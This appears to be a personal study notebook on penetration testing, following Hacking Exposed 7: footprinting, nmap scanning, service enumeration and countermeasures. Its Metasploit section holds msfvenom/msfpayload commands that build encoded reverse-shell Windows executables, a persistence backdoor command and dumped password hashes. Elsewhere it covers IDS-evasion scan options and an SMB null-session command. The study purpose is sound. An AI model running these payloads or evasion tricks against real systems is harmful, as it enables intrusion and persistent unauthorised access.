# rules
  * no harm
  * define and honor boundaries
  * consider contermeasures only after haking is complete
  * get agreement in advance
  * document everything

# start postgres db
  * Metasploit uses PostgreSQL as its database so it needs to be launched first.
    ```
      service postgresql start
      ** You can verify that PostgreSQL is running by checking the output of ss -ant and making sure that port 5432 is listening.

      State Recv-Q Send-Q Local Address:Port Peer Address:Port
      LISTEN 0 128 :::22 :::*
      LISTEN 0 128 *:22 *:*
      LISTEN 0 128 127.0.0.1:5432 *:*
      LISTEN 0 128 ::1:5432 :::*
    ```
  * Initialise the Metasploit PostgreSQL Database

      With PostgreSQL up and running, we next need to create and initialize the msf database.
      ```
      pg_ctl init -D /var/db/postgresql/defaultdb/
      pg_ctl -D /var/db/postgresql/defaultdb -l /var/db/postgresql/defaultdb/logfile start
      su - postgres -c "pg_ctl -D /var/db/postgresql/defaultdb/ start"

      psql
      create user root;
      create database ms;

      msfdb init
      ```
  * Launch msfconsole in Kali

    Now that the PostgreSQL service is up and running and the database is initialized, you can launch msfconsole and verify database connectivity with the db_status command as shown below.
    ```
    msfconsole
    db_disconnect
    msf > db_status
    [*] postgresql connected to msf3
    msf >

    umount -a -t cifs -l

    apt-cdrom -d=/dev/sr0 add

    traceroute www.google.com 
      -f 8   //ttl
      -w 2   //wait time
      -q 4   // query count
      -n     // not use hostname,use ip address instead
     ```
  * wireshark
      ip.src == 192.168.11.1
      udp.port==68 or udp.port==67
  
  * HSM
    A hardware security module (HSM) is a physical computing device that safeguards and manages digital keys 
    for strong authentication and provides cryptoprocessing

  * Metasploit
      [-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
      [-] This script requires the use of a SYSTEM user context (hint: migrate into service process)
         find a system process get pid
         migrate pid

    Administrator:500:c0ad129bd4e0e675ab0b09b894a430a5:64f2a499e4fc2846acfaa3c2381ed559:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HelpAssistant:1000:bc156931ebe3fa457e2260fe8b464b5c:04d8217f38d4aab7c2ad9ee56ed93b01:::
    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2f99608b6d63ec34d85538bdef5916e1:::

    [*] Authenticating to 10.0.128.4:445|WORKGROUP as user 'Administrator'...
    
    [-] FAILED! The remote host has only provided us with Guest privileges. 
        Please make sure that the correct username and password have been provided. 
        Windows XP systems that are not part of a domain will only provide Guest privileges to network logins by default.

    * run scraper
      > timeout
    * pessistent:
      > run persistence -X -i 50 -p 443 -r ip
        
    * payload:  
    ```  
      msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=31337 -f exe -o /var/www/payload1.exe

      msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 X > /var/www/payload1.exe

      msfpayload windows/shell_reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -t exe > /var/www/payload2.exe 

       msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | \
        msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe
      ```

    - use external modules
      ```
      mkdir -p $HOME/.msf4/modules/exploits/android/shell_reverse_tcp.rb

      msf > reload_all
      msf > use exploit/android/shell_reverse_tcp

      msf > loadpath
          

  * Nping 0.7.30 ( https://nmap.org/nping )
    EXAMPLES:
    ```
      nping scanme.nmap.org
      nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1
      nping --icmp --icmp-type time --delay 500ms 192.168.254.254
      nping --echo-server "public" -e wlan0 -vvv
      nping --echo-client "public" echo.nmap.org --tcp -p1-1024 --flags ack
    ```
    SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES
    ```
    nping --arp --arp-type arp-reply --arp-sender-mac a1:8f:16:54:c2:38 --arp-sender-ip 192.168.43.1 --arp-target-mac 84:4b:f5:85:91:8e --arp-target-ip 192.168.43.206 192.168.43.206
    echo "this is a test from all of you" |  ncat -u 127.0.0.1 4913
    ```

  * nmap
    ```
    nmap -sU -p 67 --script dhcp-discover --script-args 'dchptype=DHCPINFORM' 192.168.1.1
    ```

  * [socat](http://www.dest-unreach.org/socat/)
    ```
    socat TCP4-LISTEN:www TCP4:www.domain.org:www

    socat TCP4-LISTEN:2022,reuseaddr,fork \
    PROXY:proxy:www.domain.org:22,proxyport=3128,proxyauth=user:pass
    ```

  * tcpreplay
    ```
    # basic usage:
    tcpreplay --intf1=eth0 sample.pcap

    # To replay traffic as quickly as possible:
      tcpreplay --topspeed --intf1=eth0 sample.pcap

    # To replay traffic at a rate of 10Mbps:
      tcpreplay --mbps=10.0 --intf1=eth0 sample.pcap

    # To replay traffic 7.3 times as fast as it was captured:
      tcpreplay --multiplier=7.3 --intf1=eth0 sample.pcap

    # To replay traffic at half-speed:
      tcpreplay --multiplier=0.5 --intf1=eth0 sample.pcap

    # To replay at 25 packets per second:
      tcpreplay --pps=25 --intf1=eth0 sample.pcap

    # To replay packets, one at a time while decoding it (useful for debugging purposes):
      tcpreplay --oneatatime --verbose --intf1=eth0 sample.pcap
    ```

* rce
  arbitrary code execution

* base64:
  ```
  Text content 	M 	a 	n
  ASCII 	77 (0x4d) 	97 (0x61) 	110 (0x6e)
  Bit pattern 	0 	1 	0 	0 	1 	1 	0 	1 	0 	1 	1 	0 	0 	0 	0 	1 	0 	1 	1 	0 	1 	1 	1 	0
  Index 	19 	22 	5 	46
  Base64-encoded 	T 	W 	F 	u
  ```
  As this example illustrates, Base64 encoding converts three octets into four encoded characters.
  When the number of bytes to encode is not divisible by three, Add extra bytes with value zero 
  ```
  Text content 	M 		
  ASCII 	77 (0x4d) 	0 (0x00) 	0 (0x00)
  Bit pattern 	0 	1 	0 	0 	1 	1 	0 	1 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0
  Index 	19 	16 	0 	0
  Base64-encoded 	T 	Q 	= 	=
  ```

- windows
  - gs
    - disable when buffer size <=4
      ```
      #pragma strict_gs_check([push,] on )   
      #pragma strict_gs_check([push,] off )   
      #pragma strict_gs_check(pop) 
      ```
    - usage
      - When you compile this code with /GS, no cookie is inserted in the stack, because the array data type is a pointer. 
      - Adding the strict_gs_check pragma forces the stack cookie into the function stack.
      ```c
      // pragma_strict_gs_check.cpp  
      // compile with: /c  
      // https://blogs.technet.microsoft.com/srd/2009/03/16/gs-cookie-protection-effectiveness-and-limitations/
      #pragma strict_gs_check(on)  
        
      void ** ReverseArray(void **pData,  
                          size_t cData)  
      {  
          // *** This buffer is subject to being overrun!! ***  
          void *pReversed[20];  
        
          // Reverse the array into a temporary buffer  
          for (size_t j = 0, i = cData; i ; --i, ++j)  
              // *** Possible buffer overrun!! ***  
                  pReversed[j] = pData[i];   
        
          // Copy temporary buffer back into input/output buffer  
          for (size_t i = 0; i < cData ; ++i)   
              pData[i] = pReversed[i];  
        
          return pData;  
      }  
      ```

    - ASLR
      - options
        ```
        /DYNAMICBASE[:NO]  
        ```

      - rules
        - heap
          - request an allocation of size rand(0..31) * 64kb then free extra
        
        - stack
          - skip rand(0..31) STACK_SIZE(64kb 256kb), then alloc stack
          - skip rand(0..PAGE_SIZE/2)(PTR alignment: 4b(x86) 8b(x64) or 16b(AI64)) bytes from top of the stack

        - image
          - offset starting address of first image(NTDLL.DLL) by rand(0..255) * 64kb and then pack image after that

    - [DEP](https://blogs.technet.microsoft.com/srd/2010/12/08/on-the-effectiveness-of-dep-and-aslr/)
      ```c
      BOOL WINAPI SetProcessDEPPolicy(
        _In_ DWORD dwFlags
      )
      ```

* hack expose 7
  * footprint
    * methods
      1. Internet
        - domain name
        - network 
        - specific network address reachable via Internet
        - system arch
        - acl
        - ids
        - system enumeration
        - dns hostname 
      2. intranet
        - above 
        - network protocols
      3. remote Access
        - tel
        - remote sys type
        - authentication mechanism
        - vpns and related protocols(PPTP, IPsec)
      4. extranet
        - domain name
        - connection src and dest
        - type of connection
        - access control mechanism
    * steps
     1. activity scope
     2. proper authorization
     3. publicity available info
      - web pages
        - website mirror tools
          - wget
            wget -r -nH --cut-dirs=1 --level=6 http://www.742bb.com/
            find -type f -name "*" 
          - teleport pro 
      - related organizations
        - comments on code
      - location
        - google earth
        - google maps
      - employee info
        - www.whitepages.com
        - http://www.yellowpages.com/
        - http://www.411.com/
        - blackbookonline.info
        - peoplesearch.com
        - bigyellow.com
        - whowhere.com
        - ussearch.com
        - usafind.com
      - current events
        - sce
      - privacy, security polices and technical details
      - archived info
        - archive.org
          http://www.baidu.com/robots.txt
      - search engine and data relationship
        - google
        - bing
        - dogpile.com
        - ask.com
        - http://hackersforcharity.org/ghdb/
        - https://www.exploit-db.com/google-hacking-database/
        - hotbot.com
        - excite.com
        - [sitedigger](https://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx#)
        - [FOCA](https://www.elevenpaths.com/labstools/foca/index.html#)
      - other info of interest
        practice
      - contermeasures
        - faqs.org/rfcs/rfc2196.html
    4. whois and dns enumeration
        - ICANN(Internet corporation for assigned names and numbers)[icann.org]
          - Internet domain names
          - ip address numbers
          - protocol parameters and port numbers
          - coordinate stable of root dns system
        - ICANN includes:
          - Address Supporting Organization(ASO),.aso.icann.org
          - Generic Names Supporting Organization(GNSO), gnso.icann.org
          - Country Code Domain Name Supporting Organization (CCNSO), ccnso.icann.org
                 ip
          - ASO ----> Regional Internet Registries (RIRs) -->ISPs, National Internet Registries (NIRs),Local Internet Registries (LIRs) 
        - whois
          - whois.iana.org
          - www.allwhois.com -> https://www.markmonitor.com/
          - superscan, netscan...
          - jwhois
      - contermeasures
        - pay for domain to keep your contact info secret
    5. dns interrogation
      - DNS zone transfer:allows a secondary master server to update its zone database fromthe primary master
        1. This vulnerability allows for significant info rmation gathering on a target.
        2. It is often the springboard to attacks that would not be present without it.
        3. Believe it or not, you can find many DNS servers that still allow this feature.
      - tools
        - nslookup: nslookup set type=any 
        - host:host -l -v -t any bing.com
        - dig
        - dnsrecon, dnsenum, dnsmap, 
        - fierce
      - contermeasures
        - configure named.conf or Microsoft's dns to restrict or disable zone transfer
        - deny all authorized inbound  connection to TCP on port 53
          - query throught UDP on port 53
          - zone transfer TCP on port 53
          - rfc states that dns queries  > 512B via tcp 
          - use TSIGs(transition signatures) allows only trusted host transfer zone info.  rfc2845
    6. network reconnaissance
      - traceroute -p53 -I www.google.com
      - contermeasures
        - nids
          - snort
        - ips

  2. scanning
    -arp host discovery
      - arp-scan
      - nmap -sn -PR 192.168.1.0/24
      - [cain](oxid.it/cain.html)

    - icmp host discovery
      - ping -c 2 192.168.1.1
      - nping -c 2 --icmp --icmp-type echo 192.168.1.1
      - nmap -sn -PE --send-ip 192.168.1.0/24 
        * PE echo request
        * PM mask
        * PP timestamp
      - superscan

    - tcp/udp host discovery
      - nmap -Pn -Ss -p 22 --open 192.168.1.0/24
      - superscan
      - nping --tcp -p 21 --ttl 3 --flags syn 192.168.1.0/24

    - contermeasures
      - fireware
      - detecte tools(Unix)
        1. [scanlogd](http://www.openwall.com/scanlogd)
        2. [Courtney](https://packetstormsecurity.com/files/12903/courtney-1.3.tar.Z.html)
        3. ippl
        4. protolog
      - icmp
        - allow only ECHO_REPLY, HOST_UNREACHABLE, TIME_EXCEEDED packet to dmz 
        - limit icmp traffic using acl

      - tcp/udp -- decide which service to run on host
        - port scan identify folling things:
          1. tcp/udp service on system
          2. os type
          3. application or version of a service
        - scan type (ietf.org/rfc/rfc0793.txt): sys connect scans works against all os
          - tcp connect: -sT
          - tcp SYN : -sS
          - tcp FIN: -sF send FIN to target, send back RST on unix-base tcp/ip stacks
          - tcp XMAS tree: send FIN URG PSH to target port, target should sent RST (The term derives from a fanciful image of 
            each little option bit in a header being represented by a different-colored light bulb, all turned on, as in, 
            "the packet was lit up like a Christmas tree."[1] It can also be known as a kamikaze packet, nastygram, or lamp test segment.)
          - tcp NULL: turn off all flags, target should send back RST 
          - tcp ACK: mapout firewall rulesets
            1. a simple packet filter allowing only established connections
            2. a stateful firewall performing advanced packet filtering
          - tcp windows scan: detect open as well as filterd/nonfiltered ports on some systems(AIX, FreeBSD) due to an anomaly
            reported TCP windows size
          - tcp RPC scan: detect and identify rpc ports and their associated program and version
          - udp scan: target respond 'ICMP port UNREACHABLE" --> port closed , else reduce port is open , but as udp is connectionless 
            accuracy is affected by utilization or filter of target network, it can also be very slow

        - identify TCP and UDP services running
          - namp -sS 192.168.1.1 -oN
            - –f option to fragment the packets, make it harder for access control devices 
              or intrusion detection systems (IDS) to detect the scan
            - -D launch decoy scans at the same time real scan is launched, the decoy address should be alive
              otherwise, SYN-flood scan may happen to target system
            - nmap -sS 192.168.2.1 -D 192.168.2.254 -vv
          - [ftp bounce scan](ietf.org/rfc/rfc0959.txt)
            - lauch connections throught a ftp server by abusing the support for proxy ftp connection
            - -b options in nmap , be very slow, ftp server must :
              1. have readable and writable dir such as /incoming
              2. allow nmap use bogus port info to it via PORT method
              3. supper scan
          - superscan
          - [ScanLine](https://www.mcafee.com/us/downloads/free-tools/scanline.aspx?_ga=1.159898104.439281320.1486605079#)
            ```
            sl -v -t 21,22,23,25 -u 53,135,139 192.168.1.1
            ```
          - netcat(nc): 
            ```
            nc -v -z -w 2 192.168.1.1 1-140
            ```

        - port scan countermeasures
          - ids : snort
          - unix: scanlogd, windows: attacker
          - firewall: configure alerts to fire in real time via e-mail, use threshold logging 
          - disable unneccesary services
      
      - detect os
        - guess from opened ports
          - 135, 139, 445 netbios
          - 3389 rdp
          - 22 ssh 
          - unix: rpc nfs 
        - [active stack fingerprint](https://nmap.org/nmap-fingerprinting-article.txt)
          - fin probe: windows send back fin/ack
          - bogus flag probe: undefined flag is set to tcp head of a sys packet, some such as linux set the flags 
            and send to back
          - ISN sampling: initial sequence number choose by tcp implemention is different
          - DF monitor: don't fragment is set by some os to enhance performance, of which monitor can be done to 
            identify os type
          - tcp initial window size: for some stack implemention, the size is unique
          - ACK value: some return it back, others return seq number +1
          - ICMP error message quenching: [RFC 1812](ietf.org/rfc/rfc1812.txt) limit rate at error msg send, by
            sending UDP packets to some random high-numbered port, you can count the rate 
          - ICMP message quota: different quoto info are send in different os
          - ICMP error message -- echo integrity: some may alter ip address
          - TOS: For “ICMP PORT UNREACHABLE” messages, the TOS(type of service) is examined. Most stack implementations use 0, 
              but this can vary.
          - fragmentation handling: “Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection,”
            different stacks handle overlapping fragments differently
          - tcp options: By sending a packet with multiple options set—such as no operation, maximumsegment size, 
            window scale factor,and timestamps—you can make some assumptions about the target operating system
          ```
          nmap -O 192.168.1.1
          ```

        - contermeasures
          - change system settings:TCP_DROP_SYNFIN in FreeBSD
          - fireware 

      - [passive os detection](http://old.honeynet.org/papers/finger/)
        - passive stack fingerprint
          - tcp areas :
           - TTL - What the operating system sets the Time To Live on the outbound packet
           - Window Size - What the operating system sets the Window Size at.
           - DF - Does the operating system set the Don't Fragment bit.
           - TOS - Does the operating system set the Type of Service, and if so, at what.

  3. enumeration
    - service fingerprinting
      ```
        nmap -sS 192.168.1.1 -p 1417
        nmap -sV 192.168.1.1 -p 1417
        amap another tool 
      ```
    - vulnerability scanners
      - nessus
      - openvas
      - nse:(nmap scripting engine)
        ```
          –sC to run a set of default scripts : --script=default
        nmap -Pn --script smb-check-vulns --script-args=unsafe=1 192.168.2.1

        Starting Nmap 6.47 ( http://nmap.org ) at 2017-02-10 16:47 CST
        Nmap scan report for 192.168.2.1
        Host is up (0.00019s latency).
        Not shown: 995 filtered ports
        PORT     STATE SERVICE
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        5678/tcp open  rrac
        5900/tcp open  vnc
        MAC Address: 00:50:56:C0:00:08 (VMware)

        Host script results:
        | smb-check-vulns: 
        |   Conficker: Likely CLEAN; access was denied.
        |   |  If you have a login, try using --script-args=smbuser=xxx,smbpass=yyy
        |   |  (replace xxx and yyy with your username and password). Also try
        |   |_ smbdomain=zzz if you know the domain. (Error NT_STATUS_ACCESS_DENIED)
        |   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
        |   MS06-025: NO SERVICE (the Ras RPC service is inactive)
        |_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)

        Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
        ```
      - countermeasures
        - ips
        - ids
    
    - basic banner grabbing
      - telnet 192.168.1.2 22
      - nc -nvv 192.168.1.2 80 < nudge.txt
        ```
        cat nudge.txt
        GET http://192.168.2.131 HTTP/1.0
        

        ```

      - countermeasures 
        - shutdown unneccessary services
        - for critical service can't be turned off, try not show vendors or version in banner

    - enumerating common network services
      - ftp 21
        ```
        ftp> open ftp.ubuntu.com
        Connected to ftp.ubuntu.com.
        220 FTP server (vsftpd)
        Name (ftp.ubuntu.com:root): anonymous
        331 Please specify the password.
        Password:
        230 Login successful.
        Remote system type is UNIX.
        Using binary mode to transfer files.
        ftp> ls
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        drwxr-xr-x    7 999      999          4096 Feb 10 10:04 ubuntu
        226 Directory send OK.
        ftp> cd ubuntu
        250 Directory successfully changed.
        ftp> pwd
        257 "/ubuntu" is the current directory
        ftp> ls
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        drwxrwxr-x   37 999      999          4096 Oct 18 08:56 dists
        drwxr-xr-x    2 999      999        143360 Feb 10 09:54 indices
        -rw-r--r--    1 999      999      15297784 Feb 10 10:08 ls-lR.gz
        drwxrwxr-x    6 999      999          4096 Feb 27  2010 pool
        drwxr-xr-x    3 999      999          4096 Jun 28  2013 project
        lrwxrwxrwx    1 999      999             1 Nov 24  2010 ubuntu -> .
        226 Directory send OK.
        ```

      - ftp enumeration countermeasures
        - always use secure sftp(via ssh), ftps(via ssl)
        - be skeptical about anonymous login, deny upload files
        - maybe use http 

      - telnet enumeration tcp port 23

      - telent countermeasures
        - use SSH

      - SMTP 25
        - sendmail
        - postfix
        ```
          telnet 192.168.2.131 25
          220 centos.163.com ESMTP Postfix
          vrfy root
          252 2.0.0 root
          expn test
          502 5.5.2 Error: command not recognized
          quit
          221 2.0.0 Bye


          Connection to host lost.
        ```
      
      - smt enumeration countermeasures
        - turn off if posssible
        - configure to disable some commands(EXPN, VRFY) being used by nonprivileged user

      - DNS tcp/udp 53
        - zone transfers
          ```
          dig @192.168.2.131 dob.com axfr
            ; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 <<>> @192.168.2.131 dob.com axfr
            ; (1 server found)
            ;; global options: +cmd
            dob.com.		172800	IN	SOA	ns1.dob.com. centos.dob.com. 2003080800 43200 900 1814400 7200
            dob.com.		172800	IN	NS	ns1.dob.com.
            dob.com.		1814400	IN	MX	10 mail.dob.com.
            centos.dob.com.		172800	IN	CNAME	ns1.dob.com.
            mail.dob.com.		172800	IN	A	192.168.2.131
            ns1.dob.com.		172800	IN	A	192.168.2.131
            www.dob.com.		172800	IN	A	192.168.2.131
            dob.com.		172800	IN	SOA	ns1.dob.com. centos.dob.com. 2003080800 43200 900 1814400 7200
            ;; Query time: 1 msec
            ;; SERVER: 192.168.2.131#53(192.168.2.131)
            ;; WHEN: Sun Feb 12 02:35:04 2017
            ;; XFR size: 8 records (messages 1, bytes 209)


          C:\Windows\system32>nslookup
          Default Server: 192.168.1.1 
          Address:  192.168.1.1

          > server 192.168.2.131
          Default Server:  [192.168.2.131]
          Address:  192.168.2.131

          > ls -d dob.com
          [[192.168.2.131]]
          dob.com.                       SOA    ns1.dob.com centos.dob.com. (2003080800 4
          3200 900 1814400 7200)
          dob.com.                       NS     ns1.dob.com
          dob.com.                       MX     10   mail.dob.com
          centos                         CNAME  ns1.dob.com
          mail                           A      192.168.2.131
          ns1                            A      192.168.2.131
          www                            A      192.168.2.131
          dob.com.                       SOA    ns1.dob.com centos.dob.com. (2003080800 4
          3200 900 1814400 7200)
          >
          ```

        - bind enumeration 
          ```
          dig @192.168.2.131 version.bind txt chaos
          ; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 <<>> @192.168.2.131 version.bind txt chaos
          ; (1 server found)
          ;; global options: +cmd
          ;; Got answer:
          ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62424
          ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
          ;; WARNING: recursion requested but not available

          ;; QUESTION SECTION:
          ;version.bind.			CH	TXT

          ;; ANSWER SECTION:
          version.bind.		0	CH	TXT	"9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4"

          ;; AUTHORITY SECTION:
          version.bind.		0	CH	NS	version.bind.

          ;; Query time: 0 msec
          ;; SERVER: 192.168.2.131#53(192.168.2.131)
          ;; WHEN: Sun Feb 12 03:50:11 2017
          ;; MSG SIZE  rcvd: 95
          ```

        - dns cache snooping
          
        - dns enumeration
          - dnsenum
          - fierce.pl
          - http://centralops.net/
        
        - dns enumeraton countermeasures
          - windows dns config mmc computer management
            '''
             \Services and Applications\DNS\[server_name]\Forward Lookup Zones\[zone_name] 
            ```
          - named configure acl and allow-transfor{};

          - blocking bind version.bind request
            ```
            dig @192.168.2.131 version.bind choas txt

            ; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 <<>> @192.168.2.131 version.bind choas txt
            ; (1 server found)
            ;; global options: +cmd
            ;; Got answer:
            ;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 30291
            ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

            ;; QUESTION SECTION:
            ;version.bind.			IN	A

            ;; Query time: 4005 msec
            ;; SERVER: 192.168.2.131#53(192.168.2.131)
            ;; WHEN: Mon Feb 13 03:11:17 2017
            ;; MSG SIZE  rcvd: 30

            ;; Got answer:
            ;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 12958
            ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

            ;; QUESTION SECTION:
            ;choas.				IN	TXT

            ;; Query time: 3355 msec
            ;; SERVER: 192.168.2.131#53(192.168.2.131)
            ;; WHEN: Mon Feb 13 03:11:26 2017
            ;; MSG SIZE  rcvd: 23
            ```
          
          - disable dns caching snooping
            Luis Grangeia http://cs.unc.edu/~fabian/course_papers/cache_snooping.pdf

        - enumerating tftp tcp/udp 69
          - tftp 192.168.2.131
            ```bash
            tftp 192.168.2.131
            tftp> verbose
            Verbose mode on.
            tftp> trace
            Packet tracing on.
            tftp> get test
            getting from 192.168.2.131:test to test [netascii]
            sent RRQ <file=test, mode=netascii>
            received DATA <block=1, 0 bytes>
            tftp> get /etc/passwd /tmp/passwd.copy
            getting from 192.168.2.131:/etc/passwd to /tmp/passwd.copy [netascii]
            sent RRQ <file=/etc/passwd, mode=netascii>
            received ERROR <code=1, msg=File not found>
            Error code 1: File not found
            ```
          - Accessing Router/Switch Configurations via TFTP, such as:
            1. runing-config
            2. startup-config
            3. .config
            4. config
            5. run

          - TFTP Enumeration Countermeasures
            - TFTP is an inherently insecure protocol—the protocol runs in cleartext on the wire, it offers no authentication mechanism, 
              and it can leave misconfigured file-system ACLs wide open to abuse.
            - don't run tftp, or :
              1. wrap it to restrict access (using a tool such as TCP Wrappers), 
                1. /etc/hosts.allow
                  ```
                  in.tftpd: LOCAL
                  ```
                2. /etc/host.deny
                  ```
                  in.tftpd: ALL: spawn (/usr/sbin/safe_finger -l @%h | \
                              /usr/ucb/mail -s %d-%h root) &
                  ```
                3. logs:
                  ```
                  Feb 14 00:19:04 centos xinetd[5185]: START: tftp pid=6444 from=192.168.2.135
                  Feb 14 00:19:04 centos xinetd[6444]: libwrap refused connection to tftp (libwrap=in.tftpd) from 192.168.2.135
                  Feb 14 00:19:04 centos xinetd[6444]: FAIL: tftp libwrap from=192.168.2.135
                  Feb 14 00:19:04 centos xinetd[5185]: EXIT: tftp status=0 pid=6444 duration=0(sec)
                  ```
              2. limit access to the/tftpboot directory
              3. make sure it’s blocked at the border firewall.
        - finger tcp/udp 79
          - finger -l @192.168.2.131

        - finger countermeasures
          - disable finger-server
            ```
            vim /etc/xinetd.conf/finger
            
            # disable = yes
            ```
          - stop xinetd
            ```
            killall -HUP xinetd
            ```

          - block port 79
            ```
            iptables -filter -I INPUT -p tcp --dport 79 -j DROP
            service iptabls save
            ```
          - if must use, configure tcp Wrappers
            ```
            vim /etc/host.deny
            in.finger: ALL: spawn (/usr/sbin/safe_finger -l @%h | \
                        /usr/ucb/mail -s %d-%h root) &)
            ```
        
        - enumerating http tcp 80
          - http
            ```
            C:\Windows\system32>ncat 192.168.2.131 80
              HEAD / HTTP/1.0

              HTTP/1.1 200 OK
              Server: nginx/1.11.6
              Date: Wed, 15 Feb 2017 09:08:36 GMT
              Content-Type: text/html; charset=UTF-8
              Connection: close
              X-Powered-By: PHP/7.0.13

              close: Result too large
            ```
          - https:We did this because servers have the ability to host multiple websites, so in some cases you may have to set
                  the HTTP host header to the hostname of the web page you’re visiting to elicit a 200 OK
            ```
            OpenSSL> s_client -quiet -connect 192.168.2.131:443
              Loading 'screen' into random state - done
              depth=0 C = US, ST = New York, L = New York City, O = "Dobly, Inc.", OU = Securi
              ty Department, CN = centos.dob.com, emailAddress = doblys@yahoo.com
              verify error:num=18:self signed certificate
              verify return:1
              depth=0 C = US, ST = New York, L = New York City, O = "Dobly, Inc.", OU = Securi
              ty Department, CN = centos.dob.com, emailAddress = doblys@yahoo.com
              verify error:num=9:certificate is not yet valid
              notBefore=Feb 15 09:34:49 2017 GMT
              verify return:1
              depth=0 C = US, ST = New York, L = New York City, O = "Dobly, Inc.", OU = Securi
              ty Department, CN = centos.dob.com, emailAddress = doblys@yahoo.com
              notBefore=Feb 15 09:34:49 2017 GMT
              verify return:1
              HEAD / HTTP/1.1
              host: centos.lob.com

              HTTP/1.1 200 OK
              Server: nginx/1.11.6
              Date: Wed, 15 Feb 2017 10:16:53 GMT
              Content-Type: text/html
              Content-Length: 612
              Last-Modified: Wed, 16 Nov 2016 16:47:31 GMT
              Connection: keep-alive
              ETag: "582c8da3-264"
              Accept-Ranges: bytes
          ```
        
          - http enumeration countermeasures
            - IIS(Internet Information Services):
              - urlScan

        - MSRPC(Microsotf RPC Endpoint Mapper), tcp 135
          - epdump
            ```
            c:\windows\>epdump 192.168.1.1
            binding is 'ncacn_ip_tcp:192.168.1.1'
            int d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0
              binding 765294ba-60bc-48b8-92e9-89fd77769d91@ncacn_ip_tcp:192.168.1.1[1025]
              annot ''
            int 367abb81-9844-35f1-ad32-98f038001003 v2.0
              binding 00000000-0000-0000-0000-000000000000@ncacn_ip_tcp:192.168.1.1[1060]
              annot ''
            int 2f5f6521-cb55-1059-b446-00df0bce31db v1.0
              binding 00000000-0000-0000-0000-000000000000@ncacn_np:192.168.1.1[\\PIPE\\wkssvc]
              annot 'Unimodem LRPC Endpoint'
            int 2f5f6521-cb55-1059-b446-00df0bce31db v1.0
              binding 00000000-0000-0000-0000-000000000000@ncacn_np:192.168.1.1[\\pipe\\keysvc]
              annot 'Unimodem LRPC Endpoint'
            int 2f5f6521-cb55-1059-b446-00df0bce31db v1.0
              binding 00000000-0000-0000-0000-000000000000@ncacn_np:192.168.1.1[\\pipe\\tapsrv]
              annot 'Unimodem LRPC Endpoint'
            ```
          - rpcdump
          - ifids
          - winfingerprint

        - MSRPC enumeration countermeasures
          - restrict access to tcp port 135
          - expose the Exchange Server to the Internet via TCP port 135 for Outlook MAPI client
            - use VPN

        - NetBIOS, upd 137
          - NBNS(NetBIOS name service) served as the distributed naming system for Microsoft Windows–based networks
            - nbtstat: NetBIOS over TCP/IP (NetBT)
              - NetBIOS provides three distinct services:
                1. Name service for name registration and resolution (ports: 137/udp and 137/tcp)
                2. Datagram distribution service for connectionless communication (port: 138/udp)
                3. Session service for connection-oriented communication (port: 139/tcp)
              
              - Direct hosting over TCP/IP uses TCP port 445 instead of the NetBIOS session TCP port 139

              - Windows 2000 TCP/IP systems use several methods to locate NetBIOS resources:
                1. NetBIOS name cache.
                2. NetBIOS name server.
                3. IP subnet broadcasts.
                4. Static Lmhosts file.
                5. Static Hosts file (optional, depends on EnableDns registry entry (HKLM\SYSTEM\CurrentControlSet\Services\Netbt\Parameters)).
                6. DNS servers (optional, depends on EnableDns registry entry).

              - [lmhosts(LAN manager)](https://technet.microsoft.com/en-us/library/cc959839.aspx)
                * Before configuring a computer to use the LMHOSTS file, you must create the primary LMHOSTS file on each computer, 
                  name the file LMHOSTS, and save the file in the directory %systemroot %\System32\Drivers\Etc.
                * text file (An example LMHOSTS file named LMHOSTS.sam is provided with Windows 2000 in the directory % systemroot %\System32\Drivers\Etc. 
                  This is only an example file; do not use this file as the primary LMHOSTS file.)
                ```
                C:\Windows\System32\drivers\etc\lmhosts
                # reload config
                nbtstat -R
                ping -S 192.168.2.1 centos
                ```
            - net view /domian
        
        - netbios enumeration countermeasures
          - disable the Alerter and Messenger Services on individual hosts, windows 2000 and later, disabled by default;
          - disable NetBIOS over TCP/IP under the settings for individual network adapters;
          - if you block UDP 137 fromtraversing routers, you will disable Windows name resolutionacross those routers, 
            breaking any applications that rely on NBNS.

        - netbios session enumerating 139/445
          - null sessions:
            Microsoft’s Server Message Block (SMB) protocol, which forms the basis of Windows File and Print Sharing 
            (the Linux implementation of SMB is called Samba). 
            ```
            net use \\192.168.2.128\IPC$ "" /u:""

